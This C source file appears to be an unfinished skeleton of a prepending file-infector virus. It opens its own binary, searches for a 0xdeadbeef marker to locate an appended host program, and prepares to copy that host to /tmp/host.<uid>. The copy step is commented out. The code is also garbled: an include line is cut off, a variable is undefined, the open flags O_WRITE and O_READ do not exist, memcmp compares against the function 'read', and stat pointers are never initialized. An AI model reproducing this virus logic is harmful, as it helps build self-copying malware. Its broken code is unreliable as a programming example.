#include <stdlib.h>
#include <


#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/errno.h>

int main(int argc, char** argv) {
    
    // Copy Host to /tmp/host.ruid

    char tempfilename[20];
    uid_t ruid = getuid();
    sprintf(tempfilename, "/tmp/host.%u", ruid);

    // attempt to create new file
    int tempfile = open(filename, O_CREAT | O_WRITE, S_IRWXU);

    // check if that file was already there
    if (tempfile == -1 && errno == EEXIST) {
        // file exists! attempt to delete and leave
        unlink(tempfilename);

        // close our descriptor so the file is *officially* deleted
        close(tempfile);
        return 1;
    }

    // open ourselves
    int seedfile = open(argv[0], O_READ);

    if (seedfile == -1) {
        printf("Error: seedfile cannot be opened\n");
        return 1;
    }

    // get info about files
    stat* tempfilestat;
    fstat(tempfile, tempfilestat);

    stat* seedfilestat;
    fstat(seedfile, seedfilestat);
    
    char magic[4] = {0xde, 0xad, 0xbe, 0xef};
    char buf[4];

    // find the hosts start location
    do {
        read(seedfile, buf, 4);
    } while ( memcmp(magic, read, 4) != 0 );

    // where are we?
    off_t hoststart = lseek(seedfile, 0, SEEK_CUR);

    printf("%d", hoststart);

    //sendfile(tempfile, seedfile, hoststart, );

}
